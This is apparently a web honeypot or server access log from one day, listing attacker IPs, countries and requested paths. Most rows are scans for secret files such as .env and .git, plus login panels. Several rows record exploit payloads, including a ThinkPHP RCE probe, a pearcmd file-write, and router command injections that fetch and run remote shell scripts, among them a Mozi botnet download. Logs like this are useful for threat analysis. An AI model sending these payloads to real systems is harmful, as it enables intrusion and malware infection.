"2025-10-16","138.36.155.73","Mexico","HTTP","/robots.txt"
"2025-10-16","152.53.80.94","United States","HTTP","/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-16","152.53.80.94","United States","HTTP","/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-10-16","152.53.80.94","United States","HTTP","/public/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-10-16","152.53.80.94","United States","HTTP","/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/\u003c?echo(md5(\"hi\"));?\u003e+/tmp/index1.php"
"2025-10-16","152.53.80.94","United States","HTTP","/index.php?lang=../../../../../../../../tmp/index1"
"2025-10-16","152.53.80.94","United States","HTTP","/containers/json"
"2025-10-16","40.124.175.201","United States","HTTP","/actuator/health"
"2025-10-16","213.209.157.254","Germany","HTTP","/.git/config"
"2025-10-16","159.89.25.217","Germany","HTTP","/favicon.ico"
"2025-10-16","152.42.231.245","Singapore","HTTP","/favicon.ico"
"2025-10-16","139.59.117.58","Singapore","HTTP","/.env"
"2025-10-16","139.59.117.58","Singapore","HTTP","/.git/config"
"2025-10-16","167.99.141.235","Germany","HTTP","/robots.txt"
"2025-10-16","135.237.124.21","United States","HTTP","/actuator/health"
"2025-10-16","216.180.246.21","United States","HTTP","/favicon.ico"
"2025-10-16","64.62.197.123","United States","HTTP","http://api.ipify.org/?format=json"
"2025-10-16","64.62.197.122","United States","HTTP","/geoserver/web/"
"2025-10-16","216.180.246.21","United States","HTTP","/manage/account/login"
"2025-10-16","216.180.246.21","United States","HTTP","/admin/index.html"
"2025-10-16","216.180.246.21","United States","HTTP","/index.html"
"2025-10-16","216.180.246.21","United States","HTTP","/+CSCOE+/logon.html"
"2025-10-16","216.180.246.21","United States","HTTP","/cgi-bin/login.cgi"
"2025-10-16","216.180.246.21","United States","HTTP","/login.htm"
"2025-10-16","216.180.246.21","United States","HTTP","/login.html"
"2025-10-16","216.180.246.21","United States","HTTP","/login.jsp"
"2025-10-16","216.180.246.21","United States","HTTP","/login"
"2025-10-16","216.180.246.21","United States","HTTP","/doc/index.html"
"2025-10-16","216.180.246.21","United States","HTTP","/remote/login"
"2025-10-16","216.180.246.21","United States","HTTP","/web/"
"2025-10-16","24.199.100.206","United States","HTTP","/admin/config.php"
"2025-10-16","40.124.175.29","United States","HTTP","/developmentserver/metadatauploader"
"2025-10-16","196.251.73.10","Seychelles","HTTP","/.env"
"2025-10-16","176.65.149.30","The Netherlands","HTTP","/login"
"2025-10-16","80.82.77.202","The Netherlands","HTTP","/aaa9"
"2025-10-16","80.82.77.202","The Netherlands","HTTP","/aab9"
"2025-10-16","158.69.152.252","Canada","HTTP","/robots.txt"
"2025-10-16","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-16","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-16","172.202.113.68","United States","HTTP","/manager/text/list"
"2025-10-16","194.187.179.54","United States","HTTP","/favicon.ico"
"2025-10-16","167.99.141.235","Germany","HTTP","/robots.txt"
"2025-10-16","167.172.64.18","Singapore","HTTP","/favicon.ico"
"2025-10-16","213.209.157.162","Germany","HTTP","/.git/index"
"2025-10-16","185.195.233.167","Sweden","HTTP","/.env"
"2025-10-16","54.251.216.95","Singapore","HTTP","/wp-login.php"
"2025-10-16","152.42.248.47","Singapore","HTTP","/favicon.ico"
"2025-10-16","87.120.191.37","United States","HTTP","http://ip-api.com/json/"
"2025-10-16","165.232.110.25","United Kingdom","HTTP","/download/powershell/"
"2025-10-16","165.232.110.25","United Kingdom","HTTP","/get.php"
"2025-10-16","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-16","45.230.66.124","Argentina","HTTP","/boaform/admin/formLogin?username=admin\u0026psd=admin"
"2025-10-16","176.65.149.30","The Netherlands","HTTP","/login"
"2025-10-16","104.152.52.68","United States","HTTP","/favicon.ico"
"2025-10-16","165.22.68.200","Germany","HTTP","/api/tags"
"2025-10-16","104.152.52.58","United States","HTTP","/favicon.ico"
"2025-10-16","95.215.0.144","Russia","HTTP","/server-status"
"2025-10-16","164.92.117.229","United States","HTTP","/aaa9"
"2025-10-16","164.92.117.229","United States","HTTP","/aab8"
"2025-10-16","20.65.193.0","United States","HTTP","/developmentserver/metadatauploader"
"2025-10-16","204.76.203.18","The Netherlands","HTTP","/bins/"
"2025-10-16","20.98.153.37","United States","HTTP","/druid/index.html"
"2025-10-16","91.202.233.79","Turkmenistan","HTTP","/.git/config"
"2025-10-16","79.124.40.174","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-16","213.209.157.254","Germany","HTTP","/.git/index"
"2025-10-16","79.124.40.174","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-16","92.118.39.86","United States","HTTP","/op/9_md/9/9/9/9/9"
"2025-10-16","176.65.141.86","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-10-16","194.163.129.51","France","HTTP","/admin/config.php"
"2025-10-16","192.241.182.38","United States","HTTP","/.env"
"2025-10-16","192.241.182.38","United States","HTTP","/.git/config"
"2025-10-16","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-16","20.169.104.65","United States","HTTP","/manager/html"
"2025-10-16","117.209.16.241","India","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://117.209.16.241:43885/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-10-16","151.115.88.124","Poland","HTTP","/robots.txt"
"2025-10-16","66.132.153.142","United States","HTTP","/favicon.ico"
"2025-10-16","66.132.153.142","United States","HTTP","/favicon.ico"
"2025-10-16","66.132.153.142","United States","HTTP","/robots.txt"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/env/smtp.conf"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/cron/.env.bak"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/cron/.env.dev"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/env/token.bak"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/env/token.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/env/token.ini"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/env/token.log"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/erp/.env.dist"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/firebase/.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/flask/env.php"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/customer/.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/info/.env.bak"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/info/.env.dev"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/.env_sessions"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/app/.env.test"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/.jenv-version"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/api/.env.eski"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/.settings.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.uat"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.tmp"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/api/.env.dist"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.pem"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.old"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.key"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.aws"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/app/http/.env"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/app/.env.prod"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/api/.env.back"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/admin/.env.db"
"2025-10-16","78.153.140.123","United Kingdom","HTTP","/auth/.env.log"
